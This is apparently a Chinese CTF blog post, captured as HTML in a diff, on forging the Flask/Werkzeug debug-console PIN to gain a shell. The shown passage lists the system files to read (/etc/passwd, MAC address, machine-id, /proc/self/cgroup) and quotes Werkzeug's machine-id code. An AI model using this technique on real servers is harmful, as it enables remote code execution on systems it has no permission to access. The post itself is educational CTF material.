@@ -1,0 +1,596 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='0x01 前言 最近有道flask不仅仅可以绕过黑名单而且开启了debug模式可以进行pin值计算getshell\n0x02 原理 pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell\n计算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 probably_public_bits = [ username 运行当前程序的用户名 modname 当前对象的模块名，默认为flask.app getattr(app, "__name__", app.__class__.__name__) 当前对象的名称，默认为Flask getattr(mod, "__file__", None) flask包内的app.py的绝对路径 ] private_bits = [ str(uuid.getnode()) Mac地址的整型，通过int(Mac, 16)可以获取 get_machine_id() [ docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中"serial-number" = <{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid ] ] 那么我们主要研究如何得到docker的相关\n'><title>flask计算pin值</title><link rel=canonical href=https://baozongwi.xyz/p/flask-pin-calculation/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="flask计算pin值"><meta property='og:description' content='0x01 前言 最近有道flask不仅仅可以绕过黑名单而且开启了debug模式可以进行pin值计算getshell\n0x02 原理 pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell\n计算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 probably_public_bits = [ username 运行当前程序的用户名 modname 当前对象的模块名，默认为flask.app getattr(app, "__name__", app.__class__.__name__) 当前对象的名称，默认为Flask getattr(mod, "__file__", None) flask包内的app.py的绝对路径 ] private_bits = [ str(uuid.getnode()) Mac地址的整型，通过int(Mac, 16)可以获取 get_machine_id() [ docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中"serial-number" = <{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid ] ] 那么我们主要研究如何得到docker的相关\n'><meta property='og:url' content='https://baozongwi.xyz/p/flask-pin-calculation/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='姿势'><meta property='article:tag' content='flask'><meta property='article:published_time' content='2024-08-19T09:09:00+00:00'><meta property='article:modified_time' content='2024-08-19T09:09:00+00:00'><meta name=twitter:title content="flask计算pin值"><meta name=twitter:description content='0x01 前言 最近有道flask不仅仅可以绕过黑名单而且开启了debug模式可以进行pin值计算getshell\n0x02 原理 pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell\n计算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 probably_public_bits = [ username 运行当前程序的用户名 modname 当前对象的模块名，默认为flask.app getattr(app, "__name__", app.__class__.__name__) 当前对象的名称，默认为Flask getattr(mod, "__file__", None) flask包内的app.py的绝对路径 ] private_bits = [ str(uuid.getnode()) Mac地址的整型，通过int(Mac, 16)可以获取 get_machine_id() [ docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中"serial-number" = <{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid ] ] 那么我们主要研究如何得到docker的相关\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#原理>原理</a></li><li><a href=#计算>计算</a></li><li><a href=#计算脚本>计算脚本</a></li><li><a href=#demo1>demo1</a></li><li><a href=#demo2>demo2</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/flask-pin-calculation/>flask计算pin值</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-08-19T09:09:00Z>Aug 19, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 542 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>最近有道<code>flask</code>不仅仅可以绕过黑名单而且开启了<code>debug</code>模式可以进行<code>pin</code>值计算<code>getshell</code></p><h1 id=0x02>0x02</h1><h2 id=原理>原理</h2><p><code>pin</code>码是<a class=link href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020" target=_blank rel=noopener>flask</a>在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的<code>webshell</code></p><h2 id=计算>计算</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>probably_public_bits = [
+</span></span><span class=line><span class=cl>    username    运行当前程序的用户名
+</span></span><span class=line><span class=cl>    modname     当前对象的模块名，默认为flask.app
+</span></span><span class=line><span class=cl>    getattr(app, &#34;__name__&#34;, app.__class__.__name__) 当前对象的名称，默认为Flask
+</span></span><span class=line><span class=cl>    getattr(mod, &#34;__file__&#34;, None)          flask包内的app.py的绝对路径
+</span></span><span class=line><span class=cl>]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>private_bits = [
+</span></span><span class=line><span class=cl>    str(uuid.getnode())     Mac地址的整型，通过int(Mac, 16)可以获取
+</span></span><span class=line><span class=cl>    get_machine_id()            [
+</span></span><span class=line><span class=cl>            docker      /proc/self/cgroup，正则分割
+</span></span><span class=line><span class=cl>            Linux           /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定
+</span></span><span class=line><span class=cl>            macOS           ioreg -c IOPlatformExpertDevice -d 2中&#34;serial-number&#34; = &lt;{ID}部分
+</span></span><span class=line><span class=cl>            Windows     注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
+</span></span><span class=line><span class=cl>    ]
+</span></span><span class=line><span class=cl>]
+</span></span></code></pre></td></tr></table></div></div><p>那么我们主要研究如何得到<code>docker</code>的相关</p><ol><li><p>username</p><p>用户名。通过 <code>getpass.getuser()</code> 读取，通过文件读取 <code>/etc/passwd</code>。</p></li><li><p>modname</p><p>模块名。通过 <code>getattr(mod,"file",None)</code> 读取，默认值为 <code>flask.app</code>。</p></li><li><p>appname</p><p>应用名。通过 <code>getattr(app,"name",type(app).name)</code> 读取，默认值为 <code>Flask</code>。</p></li><li><p>moddir</p><p>Flask库下 <code>app.py</code> 的绝对路径。通过 <code>getattr(mod,"file",None)</code> 读取，实际应用中通过报错读取。</p></li><li><p>uuidnode</p><p>当前网络的mac地址的十进制数。通过 <code>uuid.getnode()</code> 读取，通过文件 <code>/sys/class/net/eth0/address</code> 得到16进制结果，转化为10进制进行计算。</p></li><li><p>machine_id 下面讲</p></li></ol><p>当然最重要的就是这个<code>machine_id</code>我们可以通过查看方法来看为什么</p><p>这里以<code>/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code>为例子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_machine_id</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>str</span> <span class=o>|</span> <span class=nb>bytes</span> <span class=o>|</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>_machine_id</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>_machine_id</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>_machine_id</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_generate</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>str</span> <span class=o>|</span> <span class=nb>bytes</span> <span class=o>|</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>linux</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># machine-id is stable across boots, boot_id is not.</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>filename</span> <span class=ow>in</span> <span class=s2>&#34;/etc/machine-id&#34;</span><span class=p>,</span> <span class=s2>&#34;/proc/sys/kernel/random/boot_id&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>value</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>continue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>value</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>linux</span> <span class=o>+=</span> <span class=n>value</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># Containers share the same machine id, add some cgroup</span>
+</span></span><span class=line><span class=cl>        <span class=c1># information. This is used outside containers too but should be</span>
+</span></span><span class=line><span class=cl>        <span class=c1># relatively stable across boots.</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/proc/self/cgroup&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>linux</span> <span class=o>+=</span> <span class=n>f</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>rpartition</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/&#34;</span><span class=p>)[</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>linux</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>linux</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># On OS X, use ioreg to get the computer&#39;s serial number.</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># subprocess may not be available, e.g. Google App Engine</span>
+</span></span><span class=line><span class=cl>            <span class=c1># https://github.com/pallets/werkzeug/issues/925</span>
+</span></span><span class=line><span class=cl>            <span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>Popen</span><span class=p>,</span> <span class=n>PIPE</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>dump</span> <span class=o>=</span> <span class=n>Popen</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=s2>&#34;ioreg&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;IOPlatformExpertDevice&#34;</span><span class=p>,</span> <span class=s2>&#34;-d&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>PIPE</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span><span class=o>.</span><span class=n>communicate</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#34;serial-number&#34; = &lt;([^&gt;]+)&#39;</span><span class=p>,</span> <span class=n>dump</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=k>match</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=p>(</span><span class=ne>OSError</span><span class=p>,</span> <span class=ne>ImportError</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># On Windows, use winreg to get the machine guid.</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>sys</span><span class=o>.</span><span class=n>platform</span> <span class=o>==</span> <span class=s2>&#34;win32&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=kn>import</span> <span class=nn>winreg</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=n>winreg</span><span class=o>.</span><span class=n>OpenKey</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                    <span class=n>winreg</span><span class=o>.</span><span class=n>HKEY_LOCAL_MACHINE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;SOFTWARE</span><span class=se>\\</span><span class=s2>Microsoft</span><span class=se>\\</span><span class=s2>Cryptography&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=n>winreg</span><span class=o>.</span><span class=n>KEY_READ</span> <span class=o>|</span> <span class=n>winreg</span><span class=o>.</span><span class=n>KEY_WOW64_64KEY</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=p>)</span> <span class=k>as</span> <span class=n>rk</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>guid</span><span class=p>:</span> <span class=nb>str</span> <span class=o>|</span> <span class=nb>bytes</span>
+</span></span><span class=line><span class=cl>                    <span class=n>guid_type</span><span class=p>:</span> <span class=nb>int</span>
+</span></span><span class=line><span class=cl>                    <span class=n>guid</span><span class=p>,</span> <span class=n>guid_type</span> <span class=o>=</span> <span class=n>winreg</span><span class=o>.</span><span class=n>QueryValueEx</span><span class=p>(</span><span class=n>rk</span><span class=p>,</span> <span class=s2>&#34;MachineGuid&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>guid_type</span> <span class=o>==</span> <span class=n>winreg</span><span class=o>.</span><span class=n>REG_SZ</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=n>guid</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>guid</span>
+</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>_machine_id</span> <span class=o>=</span> <span class=n>_generate</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>_machine_id</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>1. /etc/machine-id（一般仅非docker机有，截取全文）
+</span></span><span class=line><span class=cl>2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）
+</span></span><span class=line><span class=cl>3. /proc/self/cgroup 或 /proc/self/mountinfo 或 /proc/self/cpuset（一般仅docker有，仅截取最后一个docker斜杠后面的内容，但是其实一般只看这三个中的第一个）
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>例子docker/algf654131234d35g4d56ag1
+</span></span><span class=line><span class=cl>就只要algf654131234d35g4d56ag1然后进行拼接
+</span></span><span class=line><span class=cl>文件12按顺序读，12只要读到一个就可以了，1读到了，就不用读2了。
+</span></span><span class=line><span class=cl>文件3如果存在的话就截取，不存在的话就不用管
+</span></span><span class=line><span class=cl>最后machine-id<span class=o>=</span>（文件1或文件2）+文件3（存在的话）
